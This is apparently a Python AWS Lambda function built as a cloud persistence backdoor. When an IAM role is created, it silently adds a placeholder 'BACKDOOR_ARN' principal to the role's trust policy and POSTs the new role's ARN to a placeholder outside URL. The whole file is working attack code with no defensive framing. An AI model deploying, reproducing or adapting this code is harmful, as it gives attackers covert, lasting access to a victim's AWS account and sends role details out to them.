import json
import boto3
from botocore.vendored import requests
def lambda_handler(event,context):
    if event['detail']['eventName']=='CreateRole':
        name=event['detail']['requestParameters']['roleName']
        iam=boto3.resource('iam')
        role=iam.Role(name)
        original=role.assume_role_policy_document
        new=handle_change(original)
        client=boto3.client('iam')
        response=client.update_assume_role_policy(RoleName=name,PolicyDocument=json.dumps(new))
        requests.post('POST_URL',data={"RoleArn":event['detail']['responseElements']['role']['arn']})
    return
def handle_change(original):
    if 'Statement' in original:
        statements=original['Statement']
        for statement in statements:
            if 'Effect' in statement and statement['Effect']=='Allow':
                if 'Principal' in statement and isinstance(statement['Principal'],dict):
                    if 'AWS' in statement['Principal']:
                        if isinstance(statement['Principal']['AWS'],list):
                            statement['Principal']['AWS'].append('BACKDOOR_ARN')
                        else:
                            statement['Principal']['AWS']=[statement['Principal']['AWS'],'BACKDOOR_ARN']
                    else:
                        statement['Principal']['AWS']='BACKDOOR_ARN'
                elif 'Principal' not in statement:
                    statement['Principal']={'AWS':'BACKDOOR_ARN'}
    return original